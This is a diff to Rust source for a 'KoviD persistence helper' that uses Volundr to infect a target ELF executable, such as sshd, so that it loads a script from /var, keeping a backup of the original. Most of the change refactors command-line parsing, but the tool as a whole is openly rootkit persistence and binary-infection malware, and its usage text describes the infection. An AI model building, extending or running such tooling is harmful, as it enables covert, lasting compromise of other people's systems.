@@ -3,22 +3,22 @@ use std::env;
 use std::fs;
 use chrono::{DateTime, Utc};
 use std::path::Path;
+use structopt::StructOpt;
 
-const USAGE: &str = "
-    Use: [override variables] rustinstall <ELF executable>
+const ABOUT: &str = "
+    KoviD persistence helper
 
-    override defaults: VOLUNDR, KOVID, LOADER
+    Will take a target ELF executable and invoke Volundr
+    that in turn will infect the image with an instruction
+    to load a script from /var
 
-    VOLUNDR: point to Volundr directory entry point
-        default: ../volundr
+    If Volundr is compiled from non-default path ../../volundr
+    use environment variable VOLUNDR:
 
-    Examples:
-        # rustinstall $HOME/sshd
-        # VOLUNDR=/tmp/Volundr rustinstall $HOME/sshd
+        VOLUNDR=<custom path> cargo run -- <options>
 
-    Before running this program, make sure to:
-    KoviD:      build and insmod
-    Volundr:    build
+    elf_workdir/:   Infected file
+    elf_backup/:    Copy of original ELF file: <time>.<md5sum>/<file>
 ";
 
 fn fetch_output(output: &Vec<u8>) -> String {
@@ -92,7 +92,7 @@ impl Cmd<'_>{
 }
 
 impl Commit<'_> {
-    fn commit(self) -> std::io::Result<()> {
+    fn commit(self) -> anyhow::Result<()> {
 
         let md5_before = Cmd {
             tok: true,
@@ -182,14 +182,23 @@ impl Commit<'_> {
     }
 }
 
-fn main() -> std::io::Result<()> {
-    let args: Vec<String> = env::args().skip(1).collect();
-    match args.len() != 0 {
-        true => println!("target: {}", args[0]),
-        false => assert!(false, "{}", USAGE)
-    };
+#[derive(Debug, StructOpt)]
+#[structopt(
+    about = ABOUT,
+)]
+enum CliCmd {
+    #[structopt(about = "ELF binary for Volundr infection")]
+    Target(Target),
+}
 
-    let target = &args[0];
+#[derive(Debug, StructOpt)]
+struct Target {
+    #[structopt(short, long, help = "just a test")]
+    path: String,
+}
+
+fn run(opts: Target) -> anyhow::Result<()> {
+    let target = &opts.path;
     let path = env::current_exe()?;
     let path = path.parent().unwrap().display().to_string();
 
@@ -227,4 +236,10 @@ fn main() -> std::io::Result<()> {
     };
 
     ci.commit()
+}
+
+fn main() -> anyhow::Result<()> {
+    match CliCmd::from_args() {
+        CliCmd::Target(opts) => run(opts),
+    }
 }
